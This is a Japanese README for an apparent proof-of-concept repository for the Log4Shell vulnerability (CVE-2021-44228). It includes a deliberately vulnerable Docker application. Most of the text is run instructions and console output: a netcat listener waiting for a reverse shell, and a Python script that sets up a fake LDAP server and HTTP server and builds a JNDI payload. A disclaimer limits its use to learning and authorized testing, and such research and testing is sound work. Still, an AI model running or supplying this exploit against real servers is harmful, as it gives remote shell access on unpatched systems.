CVE-2021-44228に対するPoC。  
最近、ElasticSearchや Minecraftなどで広く使われている Javaのロギングライブラリlog4jに新たな脆弱性が発見されました。

このリポジトリでは、脆弱性のあるアプリケーションの例と、その脆弱性を利用したPoCの例を作成しています。

概念実証(PoC)
----------------------

PoCとして、プロセスを自動化するPythonファイルを作成しました。


```bash
pip install -r requirements.txt
```
#### :


* netcatリスナーを起動して、リバースシェル接続を受け入れます。<br>
```py
nc -lvnp 9001
```
* エクスプロイトを起動します。 <br>
**Note:** この作業を行うには、解凍したjavaアーカイブの名前が `jdk1.8.0_20` であり、同じディレクトリにある必要があります。
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/NT25-CTF/log4j-shell-poc-ja

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send Exploit Code Port:1389

Listening on 0.0.0.0:1389
```

このスクリプトは、HTTPサーバーとLDAPサーバーをセットアップし、脆弱なパラメーターに貼り付けるために使用できるペイロードも作成します。 この後、すべてがうまくいけば、lportにシェルを取得する必要があります。 

<br>


脆弱性が含まれるアプリケーション
--------------------------

脆弱なWebアプリケーションにDockerfileを追加しました。 これは、以下の手順に従って使用できます。 
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
実行すると、localhost:8080でアクセスできます。

プロジェクトをさらに開発したい場合は、プロジェクトの開発に使用したIntellijIDEを使用できます。 また、作業を少し簡単にする構成ファイルがある`.idea`フォルダーも含まれています。 おそらく他のIDEも使用できます。 



jdkバージョンの取得
--------------------------------------

Exploitを作成した時点では、どのバージョンのJavaが動作し、どのバージョンが動作しないのかがはっきりしなかったため、Java 8の最も古いバージョンの1つである`java-8u20`で動作させることにしました。

```
> https://drive.google.com/file/d/1r8F3X2e2pCN5Iar62yG4M0H8HuBK_4by/view?usp=sharing
```

アーカイブをダウンロードして解凍すると、`java` といくつかの関連するバイナリが `jdk1.8.0_20/bin` の中にあります。  
**注意：** 動作させるためには、このリポジトリにjdkフォルダを同名で展開するようにしてください。

```
> tar -xf jdk-8u20-linux-x64.tar.gz

> ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

免責事項
----------
このリポジトリは、CVE-2021-44228へのワンクリックエクスプロイトを目的としたものではありません。 このプロジェクトの目的は、人々がこの素晴らしい脆弱性について学び、おそらく自分のアプリケーションをテストするのを助けることです（ただし、この目的のためのより良いアプリケーションがあります。 [https://log4shell.tools/](https://log4shell.tools/))

私たちのチームは、悪意のある活動に対するこのエクスプロイトの使用を支援または推奨しません。したがって、支援を求める場合は、ターゲットサービスを所有しているか、ペネトレーションテストを行う権限があることを証明するものを提供する必要があります。
